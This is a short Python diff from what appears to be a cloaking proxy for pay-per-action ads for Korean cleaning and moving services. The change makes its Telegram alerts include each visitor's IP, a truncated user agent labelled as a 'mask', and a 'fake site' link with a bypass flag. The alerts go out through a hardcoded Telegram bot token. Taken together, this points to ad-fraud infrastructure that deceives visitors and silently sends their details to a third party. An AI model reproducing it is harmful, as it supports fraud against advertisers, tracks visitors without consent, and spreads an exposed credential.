@@ -1370,7 +1370,12 @@ def proxy_master_final(path):
                 cpa_info = CPA_DATA.get(k, ["알 수 없음", "None", "None"])
                 kr_keyword = cpa_info[0]
                 vendor = "B-모두클린" if t == 'B' else "A-이사방"
-                report_msg = f"💰 [{vendor} 손님 유입] | 키워드: {kr_keyword} | IP: {client_ip}"
+                fake_link = f"https://{request.host}/?k={k}&t={t}&bypass=1"
+                report_msg = (f"💰 [{vendor}]\n"
+                              f"키워드: {kr_keyword}\n"
+                              f"IP: {client_ip}\n"
+                              f"가면(UA): {user_agent[:50]}...\n"
+                              f"👁️ 가짜사이트: {fake_link}")
             
             if report_msg:
                 requests.get(f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage", 
